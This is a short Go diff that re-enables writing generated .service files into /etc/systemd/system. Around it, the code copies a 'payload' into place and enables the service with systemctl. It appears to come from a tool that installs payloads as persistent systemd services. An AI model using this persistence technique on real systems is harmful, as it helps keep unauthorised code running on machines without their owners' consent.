@@ -117,7 +117,7 @@ func createServices(files []servicefile) {
 	for i := 0; i < len(files); i++ {
 		curService := files[i]
 		//Create the .service file
-		createFile( /*"/etc/systemd/system/"+*/ curService.details.name+".service", curService.contents)
+		createFile("/etc/systemd/system/"+curService.details.name+".service", curService.contents)
 		//Place the playload in the correct location
 		copyFile(curService.details.payload, curService.details.path+curService.details.filename)
 		enableService := exec.Command("systemctl enable " + curService.details.name + ".service")
